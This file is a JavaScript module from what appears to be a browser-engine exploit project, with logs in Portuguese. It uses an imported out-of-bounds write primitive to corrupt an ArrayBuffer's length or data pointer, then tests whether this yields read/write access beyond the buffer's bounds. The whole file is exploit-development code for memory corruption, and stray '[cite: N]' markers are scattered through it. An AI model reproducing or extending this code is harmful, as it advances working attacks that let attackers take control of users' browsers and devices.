// js/script3/testCorruptMetadata.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeCorruptArrayBufferMetadataTest(
    testDescription,
    offsetToCorrupt, 
    valueToWrite,    
    bytesToWrite,
    isPointerCorruptionTest = false // Parâmetro para indicar se estamos testando corrupção de ponteiro
) {
    const FNAME_TEST = `executeCorruptMetadata<${testDescription}>`;
    logS3(`--- Iniciando Teste de Corrupção de Metadados AB: ${testDescription} ---`, "test", FNAME_TEST); // [cite: 2435]
    logS3(`   Alvo Offset (rel. início oob_array_buffer_real): ${toHex(offsetToCorrupt)}, Valor: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToWrite}`, "info", FNAME_TEST); // [cite: 2436]
    document.title = `Iniciando CorruptMetadata: ${testDescription}`; // [cite: 2437]

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST); // [cite: 2438]
        document.title = "ERRO: Falha OOB Setup"; // [cite: 2438]
        return { corruptionSucceeded: false, details: "OOB Setup Failed", potentiallyCrashed: false }; // [cite: 2438]
    }
    document.title = "OOB Configurado"; // [cite: 2439]

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength; // [cite: 2440]
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes (${toHex(initialOOBArrayBufferByteLength)})`, "info", FNAME_TEST); // [cite: 2440]

    let stepReached = "antes_escrita_oob"; // [cite: 2441]
    let corruptionAttempted = false;
    let testOutcome = {
        newByteLength: "N/A",
        readBeyondOriginal: "Não tentado",
        writeBeyondOriginal: "Não tentado",
        pointerReadAttempt: "Não aplicável (não é teste de ponteiro ou não tentado)" // [cite: 2447]
    };
    let potentiallyCrashed = true; 
    let errorOccurred = false;

    try {
        if (offsetToCorrupt >= 0 && offsetToCorrupt + bytesToWrite <= initialOOBArrayBufferByteLength) {
            logS3(`CORRUPÇÃO: Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} (${bytesToWrite} bytes) em offset abs ${toHex(offsetToCorrupt)} do oob_array_buffer_real`, "warn", FNAME_TEST); // [cite: 2443]
            stepReached = "antes_escrita_oob"; // [cite: 2443]
            document.title = `Antes Escrita OOB Metadata: ${testDescription}`; // [cite: 2443]
            
            oob_write_absolute(offsetToCorrupt, valueToWrite, bytesToWrite); // [cite: 2444]
            corruptionAttempted = true;
            logS3("Escrita OOB de metadados realizada.", "info", FNAME_TEST); // [cite: 2444]
            stepReached = "apos_escrita_oob"; // [cite: 2444]
            document.title = `Após Escrita OOB Metadata: ${testDescription}`; // [cite: 2444]
        } else {
            logS3(`AVISO: Offset de corrupção ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST); // [cite: 2446]
            stepReached = "escrita_oob_pulada_offset_invalido"; // [cite: 2446]
            document.title = `Escrita OOB Pulada (Offset Inválido): ${testDescription}`; // [cite: 2446]
            potentiallyCrashed = false; // [cite: 2446]
        }

        await PAUSE_S3(SHORT_PAUSE_S3); // [cite: 2448]
        if (corruptionAttempted) { // [cite: 2448]
            testOutcome.newByteLength = oob_array_buffer_real.byteLength; // [cite: 2449]
            logS3(`Tamanho de oob_array_buffer_real APÓS corrupção: ${testOutcome.newByteLength} bytes (${toHex(testOutcome.newByteLength)})`, "leak", FNAME_TEST); // [cite: 2449]
            
            if (!isPointerCorruptionTest) { // [cite: 2456]
                if (testOutcome.newByteLength !== initialOOBArrayBufferByteLength) { // [cite: 2450]
                    logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST); // [cite: 2451]
                    document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`; // [cite: 2451]
                } else {
                    logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita (teste de tamanho).", "info", FNAME_TEST); // [cite: 2452]
                }
                try {
                    const checkSizeView = new DataView(oob_array_buffer_real); // [cite: 2459]
                    logS3(`Nova DataView para teste de tamanho criada. Comprimento: ${checkSizeView.byteLength}`, "info", FNAME_TEST); // [cite: 2459]
                    const testOffsetBeyondOriginal = initialOOBArrayBufferByteLength + 4; // [cite: 2460]
                    const testValue = 0xABABABAB; // [cite: 2460]
                    if (testOutcome.newByteLength > initialOOBArrayBufferByteLength && testOffsetBeyondOriginal + 4 <= testOutcome.newByteLength) { // [cite: 2460]
                        logS3(`Tentando R/W além dos limites (tamanho) em ${toHex(testOffsetBeyondOriginal)}...`, "warn", FNAME_TEST); // [cite: 2461]
                        checkSizeView.setUint32(testOffsetBeyondOriginal, testValue, true); // [cite: 2461]
                        let readBack = checkSizeView.getUint32(testOffsetBeyondOriginal, true); // [cite: 2461]
                        if (readBack === testValue) { // [cite: 2462]
                            logS3(`!!! SUCESSO R/W ALÉM DOS LIMITES (TAMANHO) !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST); // [cite: 2462]
                            document.title = `R/W OOB (Tamanho) OBTIDO! - ${testDescription}`; // [cite: 2462]
                        } else {
                            logS3(`Falha R/W além dos limites (tamanho). Lido: ${toHex(readBack)}`, "error", FNAME_TEST); // [cite: 2463]
                        }
                    } else {
                        logS3("Novo tamanho do buffer (se alterado) não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST); // [cite: 2464]
                    }
                } catch (e_size_check) {
                    logS3(`ERRO ao verificar R/W com tamanho corrompido: ${e_size_check.message}`, "error", FNAME_TEST); // [cite: 2465]
                }
                potentiallyCrashed = false; // [cite: 2466]
            } else { // Lógica para teste de corrupção de PONTEIRO // [cite: 2467]
                testOutcome.pointerReadAttempt = "Tentativa de leitura iniciada"; // [cite: 2467]
                logS3("Teste de Corrupção de Ponteiro: Criando nova DataView e tentando ler do offset 0...", "warn", FNAME_TEST); // [cite: 2468]
                document.title = `Tentando Leitura Pós-PtrCorrupt: ${testDescription}`; // [cite: 2468]
                stepReached = "antes_leitura_ptr_corrompido"; // [cite: 2468]
                try {
                    const corruptedView = new DataView(oob_array_buffer_real); // [cite: 2469]
                    logS3(`Nova DataView para teste de ponteiro criada. Comprimento (baseado no tamanho NÃO ALTERADO do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST); // [cite: 2469]
                    let val = corruptedView.getUint32(0, true); // Tenta ler do início da DataView // [cite: 2470]
                    testOutcome.pointerReadAttempt = `Sucesso Leitura: Lido ${toHex(val)} de offset 0`; // [cite: 2471]
                    logS3(`   LEITURA PÓS-CORRUPÇÃO DE PONTEIRO BEM-SUCEDIDA (INESPERADO?): Valor lido = ${toHex(val)}`, "leak", FNAME_TEST); // [cite: 2471, 2620]
                    document.title = `LEITURA PÓS-PTR OK (INESPERADO): ${testDescription}`; // [cite: 2472]
                    potentiallyCrashed = false; // [cite: 2473]
                } catch (e_ptr_read) {
                    testOutcome.pointerReadAttempt = `ERRO Leitura: ${e_ptr_read.name} - ${e_ptr_read.message}`; // [cite: 2474]
                    logS3(`   ERRO ESPERADO/CAPTURADO ao tentar ler após corrupção de ponteiro: ${e_ptr_read.name} - ${e_ptr_read.message}`, "critical", FNAME_TEST); // [cite: 2475, 2509]
                    document.title = `ERRO Leitura Pós-PtrCorrupt: ${testDescription}`; // [cite: 2475, 2509]
                    errorOccurred = true; 
                    potentiallyCrashed = false; // [cite: 2476]
                }
                stepReached = "apos_leitura_ptr_corrompido"; // [cite: 2477]
            }
        } else { 
            potentiallyCrashed = false; // [cite: 2478]
        }
    } catch (mainError) {
        stepReached = "erro_principal"; // [cite: 2479]
        document.title = `ERRO Principal CorruptMetadata: ${testDescription}`; // [cite: 2479]
        logS3(`Erro principal no teste de corrupção de metadados (${testDescription}): ${mainError.message}`, "error", FNAME_TEST); // [cite: 2479]
        console.error(mainError); // [cite: 2480]
        potentiallyCrashed = false; 
        errorOccurred = true;
    } finally {
        clearOOBEnvironment(); // [cite: 2481]
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST); // [cite: 2481]
        if (potentiallyCrashed && corruptionAttempted) { // [cite: 2482]
            logS3(`O TESTE PODE TER CONGELADO/CRASHADO. Último passo logado: ${stepReached}`, "error", FNAME_TEST); // [cite: 2482]
            document.title = `CRASH/CONGELOU? Passo: ${stepReached} - ${testDescription}`; // [cite: 2482]
        }
    }
    logS3(`--- Teste de Corrupção de Metadados AB Concluído: ${testDescription} ---`, "test", FNAME_TEST); // [cite: 2483]
    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${testOutcome.newByteLength}, Leitura Pós-PtrCorrupt="${testOutcome.pointerReadAttempt}"`, "info", FNAME_TEST); // [cite: 2483]
    
    // Ajuste no título final para refletir o estado real
    if (!potentiallyCrashed && !errorOccurred && document.title.startsWith("Iniciando")) { // [cite: 2485]
         document.title = `Teste Metadata OK: ${testDescription}`;
    } else if (errorOccurred && !document.title.includes("ERRO")) {
        document.title = `ERRO OCORREU - ${testDescription}`;
    } else if (potentiallyCrashed && !document.title.includes("CRASH")) {
        // Título já deve estar como CRASH/CONGELOU
    }


    return { potentiallyFroze: potentiallyCrashed, errorOccurred, details: testOutcome }; // [cite: 2486]
}
